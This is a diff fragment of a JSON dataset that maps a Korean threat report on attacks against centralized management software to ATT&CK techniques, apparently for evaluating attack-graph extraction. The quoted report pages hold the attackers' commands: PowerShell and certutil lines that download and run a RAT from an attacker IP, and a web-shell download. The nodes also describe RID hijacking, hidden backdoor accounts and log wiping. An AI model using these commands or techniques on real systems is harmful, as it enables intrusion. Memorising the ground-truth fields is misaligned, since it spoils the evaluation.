+            {
+              "type": "fact",
+              "fact_id": "F03",
+              "name": "attacker.exploit.code",
+              "description": "침투용 공개 CVE·제로데이 익스플로잇(CVE-2023-42793 등)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F11",
+          "name": "host.os.command_session",
+          "description": "침투로 확보한 OS 명령 실행 세션. 세션 핸들 값은 보고서에 없어 체인용 도입"
+        }
+      ]
+    },
+    {
+      "node_id": "N11",
+      "tactic": "Lateral Movement",
+      "technique_id": "T1072",
+      "technique_name": "Software Deployment Tools",
+      "behavior_summary": "솔루션 배포 기능으로 공격용 계정(admin1) 생성·내부 전파",
+      "relationships": "creates(F03 → F16), transfers(F05 → F17)",
+      "report_pages": [
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Software Deployment Tools"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C08",
+          "operator": "AND",
+          "label": "솔루션 배포 기능을 통한 내부 악성코드 전파에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F02",
+              "name": "target.management_solution.endpoint",
+              "description": "외부에 포트가 열린 중앙 관리 솔루션 콘솔/오픈 DB 포트",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F03",
+              "name": "attacker.exploit.code",
+              "description": "침투용 공개 CVE·제로데이 익스플로잇(CVE-2023-42793 등)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F05",
+              "name": "attacker.malware.binary",
+              "description": "개발·입수한 악성 바이너리(RAT 등, mscert.exe·game.exe)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F16",
+          "name": "target.management_solution.admin_account",
+          "description": "솔루션에 생성한 공격용 관리자 계정(admin1)"
+        },
+        {
+          "fact_id": "F17",
+          "name": "target.internal_host.deployed_malware",
+          "description": "배포 기능으로 내부 단말에 전파된 악성코드"
+        }
+      ]
+    },
+    {
+      "node_id": "N27",
+      "tactic": "Defense Evasion",
+      "technique_id": "T1027.013",
+      "technique_name": "Obfuscated Files or Information: Encrypted/Encoded File",
+      "behavior_summary": "해킹도구·악성코드·취약점 테스트 VM 보관 드라이브를 VeraCrypt로 암호화",
+      "relationships": "transforms(F05 → F26)",
+      "report_pages": [
+        {
+          "page_number": 11,
+          "text": "도구 기능 로그에서 확인된 사용 목적\nObsidian 마크다운 에디터 -\nTypora 마크다운 에디터 -\nWireshark 네트워크 트래픽 모니터링 -\nProxifier 프록시 -\nv2rayN 프록시 -\nCCProxy 프록시 -\nSharpReverseProxy 리버스 프록시 -\nbore-v0.5.0 리버스 프록시 -\nloclx 리버스 프록시 -\nVisual Studio Code 코드 개발 -\nVisualGet 매크로 개발 -\nNavicat Premium 16 MySQL 관리 피해시스템 제어에 사용\n임대서버 내에 있는 데이터 보호\nVeraCrypt 디스크 암호화\n에 사용\n공격자끼리 연락에 사용\nTelegram 메신저\n데이터 유출에 사용\nQQ 메신저 공격자끼리 연락에 사용\nEveryThing 파일 검색 -\nMotrix 파일 다운로드 매니저 -\nInternet Download Manager 파일 다운로드 매니저 -\n취약점 테스트용 가상이미지 구\nVirtualBox 가상머신\n동에 사용\ngo-memexec 메모리 실행 라이브러리 악성코드 제작에 사용\nMemorySharp 메모리 편집 라이브러리 악성코드 제작에 사용\n시스템에 저장중인 패스워드(브\nProtected Storage PassView -\n라우져)를 출력\nInstant Messenger Password 메신저 애플리케이션의 사용자\n-\nRecovery Tool 계정 비밀번호를 복구\nDefense Evasion\nObfuscated Files or Information\n공격자는 공격을 위해 필요한 다양한 자원들을 보관하고 있는 특정 드라이브를 암호화하였다. 이 드\n라이브에는 공격에 필요한 해킹 도구, 원격제어 악성코드, 취약점 테스트용 가상머신 등 중요한 정\n보가 담겨 있었다.\n암호화에 사용된 도구는 VeraCrypt이라는 알려진 암호화 도구이다. 이 도구는 드라이브 전체를 효\n과적으로 암호화하여 외부의 접근을 차단하는데 사용된다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 11"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Obfuscated Files or Information: Encrypted/Encoded File"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C13",
+          "operator": "AND",
+          "label": "암호화 드라이브에 보관할 공격 자원(익스플로잇·악성코드·도구)",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F03",
+              "name": "attacker.exploit.code",
+              "description": "침투용 공개 CVE·제로데이 익스플로잇(CVE-2023-42793 등)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F05",
+              "name": "attacker.malware.binary",
+              "description": "개발·입수한 악성 바이너리(RAT 등, mscert.exe·game.exe)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F07",
+              "name": "attacker.tool.psexec",
+              "description": "입수한 PSEXEC/PSEXESVC 도구",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F26",
+          "name": "attacker.drive.encrypted",
+          "description": "VeraCrypt로 암호화한 공격 자원 드라이브"
+        }
+      ]
+    },
+    {
+      "node_id": "N02",
+      "tactic": "Execution",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "behavior_summary": "PowerShell로 외부에서 악성코드 다운로드·실행",
+      "relationships": "transfers(F05 → F12)",
+      "report_pages": [
+        {
+          "page_number": 18,
+          "text": "공격에 성공한 공격자는 중앙 관리 솔루션의 정책 배포 기능 등을 이용하여 추가로 내부에 악성 코\n드를 전파하였다. 이를 통해, 공격자는 시스템 내부에 더욱 깊숙히 침투하고, 더 넓은 범위의 피해를\n입힐 수 있었다.\nExecution\nCommand and Scripting Interpreter: Powershell\n파워쉘로 실행한 명령어의 일부는 아래와 같다. 모두 외부 시스템로부터 악성코드를 다운로드 받는\n명령이었다.\n공격자\npowershell wget -Uri hxxp://[ IP]/icon/favicon.ico -OutFile c:\\\n공격자\npowershell wget -Uri http://[ IP]/venus.asp -OutFile c:\\\\users\\\n공격자\npowershell mshta http://[ IP]/icon/icon.html\n공격자\npowershell wget -Uri http://[ IP]/icon/cert.txt -OutFile c:\\use\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\nCommand and Scripting Interpreter: Windows Command Shell\n최초 침투에 성공한 공격자가 사용한 명령어의 일부는 아래와 같다. 악성코드를 외부 시스템으로부\n터 다운로드 받는 명령과 탈취한 계정의 권한, 디렉토리 검색과 같은 정보 검색 명령이 주를 이루었\n다.\nipconfig\ndir c:\\\ndir \"c:\\\\Program Files\"\n공격자\npowershell \"wget -Uri http://[ IP]/icon/favicon.ico -OutFile c\npowershell c:\\users\\public\\mscert.exe\n공격자\npowershell \"(New-Object Net.WebClient).DownloadFile(\\'http://[\nwmic process get caption,processid,executablepath,commandline /for\nwmic process get executablepath\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\mscert.e\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\game.exe\ndel /f c:\\users\\public\\cert.txt c:\\users\\public\\test.txt\n'whoami > \"c:\\inetpub\\wwwroot\\test.txt\nnet user\nipconfig /all\nsysteminfo\ntasklist\ndir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test.txt\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 18"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Command and Scripting Interpreter: PowerShell"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C02",
+          "operator": "AND",
+          "label": "PowerShell 악성코드 다운로드 실행에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F04",
+              "name": "attacker.c2.url",
+              "description": "악성코드 다운로드용 공격자 HTTP URL(http://[공격자IP]/icon/...)",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F05",
+              "name": "attacker.malware.binary",
+              "description": "개발·입수한 악성 바이너리(RAT 등, mscert.exe·game.exe)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F11",
+              "name": "host.os.command_session",
+              "description": "침투로 확보한 OS 명령 실행 세션. 세션 핸들 값은 보고서에 없어 체인용 도입",
+              "is_external": false,
+              "level": "execution_required",
+              "inferred_flag": true
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F12",
+          "name": "host.rat.path",
+          "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)"
+        }
+      ]
+    },
+    {
+      "node_id": "N03",
+      "tactic": "Execution",
+      "technique_id": "T1059.003",
+      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
+      "behavior_summary": "CMD로 악성코드 다운로드(certutil -decode)와 정보 수집 명령 수행",
+      "relationships": "transfers(F05 → F12), enumerates(F11 → F13)",
+      "report_pages": [
+        {
+          "page_number": 19,
+          "text": "dir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test1.txt\npowershell \"net user\" > c:\\inetpub\\wwwroot\\test.txt\ndir \"c:\\inetpub\\wwwroot\\down\"\ndir \"c:\\users\\\"\ndir \"c:\\users\\administrator\"\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nnetstat -naop tcp | findstr ESTA\nquery session\ndir c:\\*\ntasklist > c:\\inetpub\\wwwroot\\a.txt\npowershell ls c:\\\ncmd.exe -c dir c:\\*\ntaskkill /f /im cmd.exe\n공격자\npowershell \"wget -Uri http://[ IP]/venus.asp -OutFile c:\\users\\\n공격자\ncertutil.exe -urlc\"\"\"\"\"\"ache -split -f http://[ IP]/venus.asp c\nren x:\\inetpub\\wwwroot\\venus.asp x:\\inetpub\\wwwroot\\wwinstallguide\nPersistence\nServer Software Component: Web Shell\n침투에 성공한 공격자는 지속성 유지를 위해 운영체제 명령 실행이 가능한 웹셸을 생성하였다. 웹\n셸의 사용자 인터페이스는 테스트 코드처럼 보이도록 디자인되어, 악성 파일로 의심받는 것을 회피\n하려는 의도가 있었다.\n공격자 사용 웹셸 화면\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 19"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Command and Scripting Interpreter: Windows Command Shell"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C03",
+          "operator": "AND",
+          "label": "Windows 명령셸 악성코드 다운로드·정보수집에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F04",
+              "name": "attacker.c2.url",
+              "description": "악성코드 다운로드용 공격자 HTTP URL(http://[공격자IP]/icon/...)",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F05",
+              "name": "attacker.malware.binary",
+              "description": "개발·입수한 악성 바이너리(RAT 등, mscert.exe·game.exe)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F11",
+              "name": "host.os.command_session",
+              "description": "침투로 확보한 OS 명령 실행 세션. 세션 핸들 값은 보고서에 없어 체인용 도입",
+              "is_external": false,
+              "level": "execution_required",
+              "inferred_flag": true
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F12",
+          "name": "host.rat.path",
+          "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)"
+        },
+        {
+          "fact_id": "F13",
+          "name": "host.system.recon_info",
+          "description": "수집된 시스템·계정·디렉터리 정보(ipconfig/all·net user·systeminfo 결과)"
+        }
+      ]
+    },
+    {
+      "node_id": "N04",
+      "tactic": "Persistence",
+      "technique_id": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell",
+      "behavior_summary": "OS 명령 실행 가능 웹셸(venus.asp) 생성, 테스트 코드로 위장",
+      "relationships": "creates(F06 → F14)",
+      "report_pages": [
+        {
+          "page_number": 20,
+          "text": "공격자 사용 웹셸 코드 일부\nDefense Evasion\nDeobfuscate/Decode Files or Information\n공격자는 프록시 기능을 수행하는 악성코드를 사용했다. 프록시 악성코드는 데이터 전송 시, 정해진\n인코딩 박스를 참조하여 트래픽을 인코딩한 후 전송한다.\nIndicator Removal: Clear Windows Event Logs\n피해 서버에서 공격자가 CMD 명령을 사용하여 원격 데스크톱 접속 로그에 접근하고, 최근 5개의\n이벤트를 조회하는 명령이 발견되었다. 그 후 이벤트 로그를 삭제하는 명령은 직접 발견되지 않았지\n만, 분석 시점에서는 서버의 이벤트 로그가 손상된 상태로 남아 있었다.\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nIndicator Removal: Clear Persistence\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 20"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Server Software Component: Web Shell"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C04",
+          "operator": "AND",
+          "label": "OS 명령 실행 가능 웹셸 생성에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F06",
+              "name": "attacker.web_shell.file",
+              "description": "공격자 웹셸 파일(venus.asp)",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F11",
+              "name": "host.os.command_session",
+              "description": "침투로 확보한 OS 명령 실행 세션. 세션 핸들 값은 보고서에 없어 체인용 도입",
+              "is_external": false,
+              "level": "execution_required",
+              "inferred_flag": true
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F14",
+          "name": "host.web_shell.path",
+          "description": "생성된 웹셸 경로(x:\\inetpub\\wwwroot\\venus.asp)"
+        }
+      ]
+    },
+    {
+      "node_id": "N06",
+      "tactic": "Defense Evasion",
+      "technique_id": "T1070.001",
+      "technique_name": "Indicator Removal: Clear Windows Event Logs",
+      "behavior_summary": "wevtutil로 RDP 로그 조회. 삭제 명령 미발견 — 손상 상태로만 확인(모호)",
+      "relationships": "removes(F11 → —)",
+      "report_pages": [
+        {
+          "page_number": 20,
+          "text": "공격자 사용 웹셸 코드 일부\nDefense Evasion\nDeobfuscate/Decode Files or Information\n공격자는 프록시 기능을 수행하는 악성코드를 사용했다. 프록시 악성코드는 데이터 전송 시, 정해진\n인코딩 박스를 참조하여 트래픽을 인코딩한 후 전송한다.\nIndicator Removal: Clear Windows Event Logs\n피해 서버에서 공격자가 CMD 명령을 사용하여 원격 데스크톱 접속 로그에 접근하고, 최근 5개의\n이벤트를 조회하는 명령이 발견되었다. 그 후 이벤트 로그를 삭제하는 명령은 직접 발견되지 않았지\n만, 분석 시점에서는 서버의 이벤트 로그가 손상된 상태로 남아 있었다.\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nIndicator Removal: Clear Persistence\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 20"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Indicator Removal: Clear Windows Event Logs"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F11",
+          "name": "host.os.command_session",
+          "description": "침투로 확보한 OS 명령 실행 세션. 세션 핸들 값은 보고서에 없어 체인용 도입",
+          "is_external": false,
+          "level": "execution_required",
+          "inferred_flag": true
+        }
+      ],
+      "parsers": []
+    },
+    {
+      "node_id": "N07",
+      "tactic": "Defense Evasion",
+      "technique_id": "T1070.009",
+      "technique_name": "Indicator Removal: Clear Persistence",
+      "behavior_summary": "솔루션 DB의 공격용 계정 생성 로그를 전용 java 코드로 삭제",
+      "relationships": "removes(F16 → —)",
+      "report_pages": [
+        {
+          "page_number": 21,
+          "text": "취약점 공격의 대상이 된 중앙 집중형 관리 솔루션에는 별도의 인증 과정 없이 관리자 계정을 생성\n할 수 있는 제로데이 취약점이 있었다. 이런 취약점을 악용하여 공격자는 공격용 계정을 생성하고\n악성코드를 유포하는 활동을 진행하였다. 이 과정을 통해 공격 목표를 달성한 공격자는 자신의 흔적\n을 지우기 위해 관리자 계정 생성 로그와 공격용 관리자 계정을 삭제하였다.\n공격자는 관리자 계정 생성 로그가 중앙 관리 솔루션 DB에 저장되는 것까지 파악하고 있었고, 그에\n맞춰 개발한 java 코드를 이용하여 로그를 삭제하였다. 이는 공격자가 취약점 공격 전에 제품 테스\n트와 분석을 충분히 수행했음을 나타낸다.\n솔루션 기능에 맞게 개발된 로그 삭제 코드\nObfuscated Files or Information: Dynamic API Resolution\n공격자는 동적으로 API를 로드하여 활용하기 위하여 base64 방식을 활용한다. 악성코드에서는 디\n코드된 문자열을 참조하여 함수의 주소를 획득, 활용한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 21"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Indicator Removal: Clear Persistence"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C05",
+          "operator": "AND",
+          "label": "솔루션 DB의 공격용 계정 생성 로그 삭제에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F08",
+              "name": "target.management_solution.db_credential",
+              "description": "로그 삭제 java 코드의 솔루션 DB 접속 자격증명",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F16",
+              "name": "target.management_solution.admin_account",
+              "description": "솔루션에 생성한 공격용 관리자 계정(admin1)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": []
+    },
+    {
+      "node_id": "N09",
+      "tactic": "Credential Access",
+      "technique_id": "T1003.002",
+      "technique_name": "OS Credential Dumping: Security Account Manager",
+      "behavior_summary": "백도어 계정(white$)에 RID Hijacking으로 500 RID 부여, PSEXEC 경유 추정",
+      "relationships": "creates(F07 → F15), elevates(F15 → —)",
+      "report_pages": [
+        {
+          "page_number": 22,
+          "text": "Credential Access\nOS Credential Dumping: Security Account Manager\n공격자가 백도어 계정에 RID Hijacking을 시도한 흔적이 발견되었다. RID Hijacking은 토큰 발급\n과정의 취약점을 이용해 특정 계정에 권한을 부여하는 기법이다. 이 기법을 사용하려면 SYSTEM\n권한이 필요하므로, 공격자는 PSEXEC 도구를 사용하여 피해 시스템에서 해당 동작을 실행했을 가\n능성이 높다. 피해 업체에서는 'white$'라는 계정이 백도어 계정이었으며, 이 계정은 관리자 권한\n에 해당하는 500 RID를 가지고 있었다.\n해당 공격자는 백도어 계정을 생성할 때 'white'나 'black'이란 이름을 사용하고 뒤에 '$'를 붙이는\n특징이 있다. 계정을 생성할 때 뒤에 ‘$ʼ 문자를 붙이게 되면 숨김 속성의 계정을 만들 수 있어, 관리\n자가 새롭게 만들어진 계정을 인지하지 못하게 하였다.\n$가 붙은 계정의 조회 결과\n이와 같은 기능은 공격자가 사용한 계정 생성 악성코드에 포함되어 있었다.\n공격자가 사용한 계정 white$\nLateral Movement\nLateral Tool Transfer\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 22"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "OS Credential Dumping: Security Account Manager"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C06",
+          "operator": "AND",
+          "label": "RID Hijacking 백도어 계정 권한 부여에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F07",
+              "name": "attacker.tool.psexec",
+              "description": "입수한 PSEXEC/PSEXESVC 도구",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F11",
+              "name": "host.os.command_session",
+              "description": "침투로 확보한 OS 명령 실행 세션. 세션 핸들 값은 보고서에 없어 체인용 도입",
+              "is_external": false,
+              "level": "execution_required",
+              "inferred_flag": true
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F15",
+          "name": "host.backdoor.account",
+          "description": "생성된 백도어 OS 계정(white$, 500 RID, 숨김 속성)"
+        }
+      ]
+    },
+    {
+      "node_id": "N05",
+      "tactic": "Defense Evasion",
+      "technique_id": "T1140",
+      "technique_name": "Deobfuscate/Decode Files or Information",
+      "behavior_summary": "프록시 악성코드가 reference box 참조해 트래픽 인코딩",
+      "relationships": "transforms(F12 → —)",
+      "report_pages": [
+        {
+          "page_number": 20,
+          "text": "공격자 사용 웹셸 코드 일부\nDefense Evasion\nDeobfuscate/Decode Files or Information\n공격자는 프록시 기능을 수행하는 악성코드를 사용했다. 프록시 악성코드는 데이터 전송 시, 정해진\n인코딩 박스를 참조하여 트래픽을 인코딩한 후 전송한다.\nIndicator Removal: Clear Windows Event Logs\n피해 서버에서 공격자가 CMD 명령을 사용하여 원격 데스크톱 접속 로그에 접근하고, 최근 5개의\n이벤트를 조회하는 명령이 발견되었다. 그 후 이벤트 로그를 삭제하는 명령은 직접 발견되지 않았지\n만, 분석 시점에서는 서버의 이벤트 로그가 손상된 상태로 남아 있었다.\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nIndicator Removal: Clear Persistence\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 20"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Deobfuscate/Decode Files or Information"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F12",
+          "name": "host.rat.path",
+          "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+          "is_external": false,
+          "level": "report_explicit",
+          "inferred_flag": false
+        }
+      ],
+      "parsers": []
+    },
+    {
+      "node_id": "N08",
+      "tactic": "Defense Evasion",
+      "technique_id": "T1027.007",
+      "technique_name": "Obfuscated Files or Information: Dynamic API Resolution",
+      "behavior_summary": "악성코드가 Base64 디코딩으로 함수 주소 동적 획득",
+      "relationships": "deobfuscates(F12 → —)",
+      "report_pages": [
+        {
+          "page_number": 22,
+          "text": "Credential Access\nOS Credential Dumping: Security Account Manager\n공격자가 백도어 계정에 RID Hijacking을 시도한 흔적이 발견되었다. RID Hijacking은 토큰 발급\n과정의 취약점을 이용해 특정 계정에 권한을 부여하는 기법이다. 이 기법을 사용하려면 SYSTEM\n권한이 필요하므로, 공격자는 PSEXEC 도구를 사용하여 피해 시스템에서 해당 동작을 실행했을 가\n능성이 높다. 피해 업체에서는 'white$'라는 계정이 백도어 계정이었으며, 이 계정은 관리자 권한\n에 해당하는 500 RID를 가지고 있었다.\n해당 공격자는 백도어 계정을 생성할 때 'white'나 'black'이란 이름을 사용하고 뒤에 '$'를 붙이는\n특징이 있다. 계정을 생성할 때 뒤에 ‘$ʼ 문자를 붙이게 되면 숨김 속성의 계정을 만들 수 있어, 관리\n자가 새롭게 만들어진 계정을 인지하지 못하게 하였다.\n$가 붙은 계정의 조회 결과\n이와 같은 기능은 공격자가 사용한 계정 생성 악성코드에 포함되어 있었다.\n공격자가 사용한 계정 white$\nLateral Movement\nLateral Tool Transfer\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 22"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Obfuscated Files or Information: Dynamic API Resolution"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F12",
+          "name": "host.rat.path",
+          "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+          "is_external": false,
+          "level": "report_explicit",
+          "inferred_flag": false
+        }
+      ],
+      "parsers": []
+    },
+    {
+      "node_id": "N10",
+      "tactic": "Lateral Movement",
+      "technique_id": "T1570",
+      "technique_name": "Lateral Tool Transfer",
+      "behavior_summary": "이중 파이프 구조로 악성 명령 전파",
+      "relationships": "transfers(F12 → —)",
+      "report_pages": [
+        {
+          "page_number": 23,
+          "text": "공격자는 명령제어 통신을 위해 파이프를 활용한다. 감염단말기에서 명령어를 외부에서 수신받아\n실행한 후, 그 결과를 송신하는 방식은 아래와 같다.\n\u0000첫번째 파이프의 입력단에 공격자의 명령어 쓰기\n\u0000첫번째 파이프의 출력단은 새로 생성될 프로세스의 표준입력으로 전달\n\u0000새로운 프로세스에서 표준출력(stdout), 표준에러(stderr)는 두번째 파이프의 입력단으로 전\n달\n\u0000두번째 파이프의 출력단은 파일 핸들로서, 데이터가 존재하는 경우 C2 서버로 전달\nSoftware Deployment Tools\n제로데이 취약점을 통해 중앙 집중형 관리 솔루션에 침투한 공격자는 솔루션의 정책 배포, 파일 배\n포 기능을 이용하여 추가로 내부에 악성 코드를 전파하였다.\n대부분의 중앙 집중형 관리 솔루션에는 로그인 성공, 실패와 같은 인증로그, 정책 배포 일자를 기록\n한 로그, 어떠한 파일이 배포되었는지를 알리는 로그 등 자체 감사 로그가 있다. 해당 로그들을 통해\n악성코드의 유포 사실을 알 수 있었다.\n공격자가 인증우회 취약점을 이용하여 공격에 성공하면 지속적인 접근을 위해 공격용 관리자 계정\n을 생성한다. 이때 보통 ‘admin1ʼ이라는 계정 이름을 많이 사용한 것으로 확인되었다. 공격용 관리\n자 계정으로 로그인 이후 공격자는 중앙 집중형 관리 솔루션의 파일 배포 및 실행 기능을 이용하여\n악성코드를 내부 시스템에 전파한다. 전파 이후 공격에 악용된 계정을 삭제조치하여 흔적을 지웠다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 23"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Lateral Tool Transfer"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C07",
+          "operator": "AND",
+          "label": "RAT 명령 전파(파이프) 수행에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F10",
+              "name": "attacker.c2.address",
+              "description": "RAT가 접속하는 C2 주소(net_Dial, 포트 8088)",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F12",
+              "name": "host.rat.path",
+              "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": []
+    },
+    {
+      "node_id": "N12",
+      "tactic": "Collection",
+      "technique_id": "T1005",
+      "technique_name": "Data from Local System",
+      "behavior_summary": "악성코드 명령(61→62)으로 폴더·파일 정보 획득",
+      "relationships": "enumerates(F12 → F18)",
+      "report_pages": [
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Data from Local System"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F12",
+          "name": "host.rat.path",
+          "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+          "is_external": false,
+          "level": "report_explicit",
+          "inferred_flag": false
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F18",
+          "name": "host.file.inventory",
+          "description": "수집한 드라이브·폴더·파일 목록(명령 61·62 결과)"
+        }
+      ]
+    },
+    {
+      "node_id": "N13",
+      "tactic": "Collection",
+      "technique_id": "T1113",
+      "technique_name": "Screen Capture",
+      "behavior_summary": "악성코드 명령(31)으로 화면 캡처, JPEG로 송부",
